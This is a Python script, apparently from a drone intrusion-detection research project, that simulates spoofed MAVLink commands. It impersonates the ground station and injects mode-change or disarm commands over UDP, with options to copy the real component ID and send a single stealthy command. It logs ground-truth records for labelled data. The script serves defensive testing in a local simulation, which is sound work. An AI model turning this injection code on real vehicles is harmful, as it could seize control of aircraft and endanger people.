#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""spoof_cmd.py — SAHTE KOMUT saldırısı (spoof_cmd).

Ne yapar: Kendini meşru yer istasyonu (sysid 255) gibi göstererek
proxy'nin telsiz kanalına (UDP 14550) TEHLİKELİ bir COMMAND_LONG enjekte
eder — ör. mod değişikliği veya disarm. Amaç, otopilotu meşru olmayan bir
komutla manipüle etmeye çalışan bir saldırganı taklit etmektir.

Varsayılan komut mod_rtl'dir: Uçağın modunu gerçekten değiştirir. disarm uçuşta
ArduPlane tarafından reddedilir, yalnızca reddedilen deneme verisi üretir.

Varyantlar:
    --taklit-compid : Gerçek yer istasyonuyla aynı sysid + compid kullanır. Yoksa
                      yanlış compid kural katmanına anında takılır.
    --tek-atis      : Tek komut gönderir (en sinsi durum). Tekrar izi bırakmaz.

GÜVENLİK: Yalnızca 127.0.0.1 hedefine bağlanır (saldiri_temel üzerinden
zorlanır). Bu betik yalnızca kendi simülasyonumuz içindir.

Kullanım:
    python betikler/saldirilar/spoof_cmd.py --ucus F106_spoof_cmd --sure 30 \
        --baslangic-gecikme 60
"""

from __future__ import annotations

import time

import saldiri_temel as st
import ortak
from pymavlink import mavutil


GCS_COMPID = 0          # ucus_yap.py'nin (gerçek yer istasyonu) compid'i
SALDIRGAN_COMPID = 190


def main() -> int:
    ap = st.temel_arg_parser(__doc__)
    ap.add_argument(
        "--komut",
        default="mod_rtl",
        choices=["disarm", "mod_rtl", "mod_manual"],
        help="Enjekte edilecek sahte komut türü.",
    )
    ap.add_argument("--taklit-compid", action="store_true",
                    help="Gerçek yer istasyonunun compid'ini kullan.")
    ap.add_argument("--tek-atis", action="store_true", help="Yalnızca tek komut gönder.")
    args = ap.parse_args()

    cfg = ortak.config_oku()
    baglanti = st.gonderen_kur(
        cfg, source_system=255,
        source_component=GCS_COMPID if args.taklit_compid else SALDIRGAN_COMPID,
    )

    st.baslangic_gecikmesi_bekle(args.baslangic_gecikme)

    ortak.log(f"Sahte komut saldırısı başlıyor: {args.komut}", "UYARI")
    start_ns = ortak.simdi_ns()
    attacker_addr = None
    hedef_sys, hedef_comp = 1, 1

    son = time.time() + args.sure
    gonderilen = 0
    while time.time() < son:
        if args.komut == "disarm":
            baglanti.mav.command_long_send(
                hedef_sys, hedef_comp,
                mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM, 0,
                0, 0, 0, 0, 0, 0, 0,  # param1=0 -> disarm
            )
        elif args.komut == "mod_rtl":
            baglanti.mav.command_long_send(
                hedef_sys, hedef_comp,
                mavutil.mavlink.MAV_CMD_DO_SET_MODE, 0,
                mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, 11, 0, 0, 0, 0, 0,
            )
        else:  # mod_manual
            baglanti.mav.command_long_send(
                hedef_sys, hedef_comp,
                mavutil.mavlink.MAV_CMD_DO_SET_MODE, 0,
                mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, 0, 0, 0, 0, 0, 0,
            )
        gonderilen += 1
        if attacker_addr is None:
            attacker_addr = st.attacker_addr_al(baglanti, cfg)
        if args.tek_atis:
            time.sleep(1.0)  # paket kaydedilmeden aralık kapanmasın
            break
        time.sleep(0.5)  # saniyede ~2 sahte komut

    end_ns = ortak.simdi_ns()
    ortak.log(f"Saldırı bitti. {gonderilen} sahte komut gönderildi.", "BILGI")

    st.ground_truth_yaz(
        args.ucus, "spoof_cmd", start_ns, end_ns,
        attacker_addr or f"{cfg.get('host')}:?",
        {"komut": args.komut, "sysid": 255, "gonderilen": gonderilen,
         "taklit_compid": args.taklit_compid, "tek_atis": args.tek_atis}, cfg,
    )
    baglanti.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
